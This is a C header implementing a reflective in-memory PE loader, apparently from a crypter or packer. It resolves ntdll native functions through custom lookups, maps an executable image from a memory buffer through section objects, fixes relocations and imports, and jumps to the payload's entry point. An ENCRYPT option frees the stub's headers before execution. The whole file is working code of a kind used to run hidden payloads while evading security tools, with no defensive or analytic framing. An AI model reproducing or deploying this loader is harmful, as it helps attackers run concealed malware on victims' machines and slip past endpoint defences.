#ifndef PE_LOADER_H
#define PE_LOADER_H

#include "winapi_loader.h"

// -------------------- Strings --------------------
STRINGA(ntdll_dll, "ntdll.dll");
STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
STRINGA(ntfreevirtualmemory, "NtFreeVirtualMemory");
STRINGA(ntcreatesection, "NtCreateSection");
STRINGA(ntmapviewofsection, "NtMapViewOfSection");
STRINGA(ntunmapviewofsection, "NtUnmapViewOfSection");

// -------------------- NTDLL typedefs --------------------
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

// -------------------- Helpers --------------------
static ULONG SectionProtection(DWORD ch) {
    if (ch & IMAGE_SCN_MEM_EXECUTE) return PAGE_EXECUTE_READ;
    if (ch & IMAGE_SCN_MEM_WRITE) return PAGE_READWRITE;
    if (ch & IMAGE_SCN_MEM_READ) return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// -------------------- Import/Export resolution --------------------
static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
    HMODULE curMod = mod;
    const char* curName = name;
    int curIsOrdinal = isOrdinal;

    for (;;) {
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)curMod;
        IMAGE_NT_HEADERS64* ntE = (IMAGE_NT_HEADERS64*)((BYTE*)curMod + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY ed = ntE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)curMod + ed.VirtualAddress);
        DWORD* addrTable = (DWORD*)((BYTE*)curMod + exp->AddressOfFunctions);
        DWORD* nameTable = (DWORD*)((BYTE*)curMod + exp->AddressOfNames);
        WORD* ordTable = (WORD*)((BYTE*)curMod + exp->AddressOfNameOrdinals);

        DWORD foundRVA = 0;
        if (!curIsOrdinal) {
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                const char* en = (const char*)((BYTE*)curMod + nameTable[i]);
                const char *p1 = en, *p2 = curName;
                while (*p1 && *p2 && *p1 == *p2) { p1++; p2++; }
                if (!*p1 && !*p2) { foundRVA = addrTable[ordTable[i]]; break; }
            }
        } else {
            DWORD ord = (DWORD)((ULONG_PTR)curName & 0xFFFF);
            foundRVA = addrTable[ord - exp->Base];
        }

        if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
            char* s = (char*)((BYTE*)curMod + foundRVA);

            size_t dllLen = 0; while (s[dllLen] && s[dllLen] != '.') dllLen++;
            char* dll = (char*)alloca(dllLen + 1);
            for (size_t i = 0; i < dllLen; i++) dll[i] = s[i]; dll[dllLen] = 0;
            s += dllLen + 1;

            size_t fnameLen = 0; while (s[fnameLen]) fnameLen++;
            char* fname = (char*)alloca(fnameLen + 1);
            for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i]; fname[fnameLen] = 0;

            HMODULE fmod = myLoadLibraryA(dll);

            if (fname[0] == '#') {
                unsigned long ordval = 0; s = fname + 1;
                while (*s >= '0' && *s <= '9') { ordval = ordval * 10 + (*s - '0'); s++; }
                curMod = fmod; curName = (const char*)(ordval | IMAGE_ORDINAL_FLAG64); curIsOrdinal = 1;
            } else {
                curMod = fmod; curName = fname; curIsOrdinal = 0;
            }
        } else {
            return (ULONG_PTR)((BYTE*)curMod + foundRVA);
        }
    }
}

static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
    IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + im.VirtualAddress);
    while (imp->Name) {
        HMODULE mod = myLoadLibraryA((char*)(base + imp->Name));
        IMAGE_THUNK_DATA64* orig = (IMAGE_THUNK_DATA64*)(base + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA64* addr = (IMAGE_THUNK_DATA64*)(base + imp->FirstThunk);

        for (; orig->u1.AddressOfData; orig++, addr++) {
            const char* funcName;
            int isOrdinal = 0;

            if (orig->u1.AddressOfData & IMAGE_ORDINAL_FLAG64) {
                funcName = (const char*)(ULONG_PTR)IMAGE_ORDINAL64(orig->u1.Ordinal);
                isOrdinal = 1;
            } else funcName = ((IMAGE_IMPORT_BY_NAME*)(base + orig->u1.AddressOfData))->Name;

            addr->u1.Function = ResolveExport(mod, funcName, isOrdinal);
        }
        imp++;
    }
}

// -------------------- PE mapping + execution --------------------
static void ExecuteFromMemory(unsigned char* data) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    HMODULE ntdll = myGetModuleHandleA(ntdll_dll);

    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = nt->OptionalHeader.SizeOfImage;

    // Create section
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)myGetProcAddress(ntdll, ntcreatesection);
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map initial RW view
    PVOID base = NULL;
    SIZE_T viewSize = 0;
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)myGetProcAddress(ntdll, ntmapviewofsection);
    NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

    // Copy headers
    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)base)[i] = data[i];

    // Copy sections
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
        BYTE* src  = data + sec[i].PointerToRawData;
        SIZE_T sz = sec[i].SizeOfRawData;
        while (sz--) *dest++ = *src++;
    }

    // Apply relocations
    ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
    if (delta) {
        IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rl.Size) {
            IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)((BYTE*)base + rl.VirtualAddress);
            BYTE* end = (BYTE*)r + rl.Size;
            while ((BYTE*)r < end && r->SizeOfBlock) {
                WORD* list = (WORD*)(r + 1);
                DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
                for (DWORD j = 0; j < count; j++)
                    if ((list[j] >> 12) == IMAGE_REL_BASED_DIR64)
                        *((ULONG_PTR*)((BYTE*)base + r->VirtualAddress + (list[j] & 0xFFF))) += delta;
                r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
            }
        }
    }

    // Resolve imports
    ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);

    // Unmap RW view
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)myGetProcAddress(ntdll, ntunmapviewofsection);
    NtUnmapViewOfSection((HANDLE)-1, base);

    // Map WCX view for execution
    base = NULL;
    viewSize = 0;
    NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);

    // Pre-mark entire module as WC to avoid leftover RWX padding
    ULONG oldProtect = 0;
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
    NtProtectVirtualMemory((HANDLE)-1, &base, &viewSize, PAGE_WRITECOPY, &oldProtect);

    // Set per-section permissions
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID sectionBase = (BYTE*)base + sec[i].VirtualAddress;
        SIZE_T sectionSize = sec[i].Misc.VirtualSize;
        ULONG newProtect = SectionProtection(sec[i].Characteristics);
        oldProtect = 0;
        NtProtectVirtualMemory((HANDLE)-1, &sectionBase, &sectionSize, newProtect, &oldProtect);
    }

    // Free discardable sections
    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
            PVOID db = (BYTE*)base + sec[i].VirtualAddress;
            SIZE_T ds = sec[i].Misc.VirtualSize;
            NtFreeVirtualMemory((HANDLE)-1, &db, &ds, MEM_DECOMMIT);
        }
    }

    // Execute entrypoint
    void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;

#ifdef ENCRYPT
    PVOID stubBase = data;
    SIZE_T stubSize = nt->OptionalHeader.SizeOfHeaders;
    NtFreeVirtualMemory((HANDLE)-1, &stubBase, &stubSize, MEM_RELEASE);
#endif // ENCRYPT

    ((void(*)(void))entryPtr)();
}

#endif // PE_LOADER_H
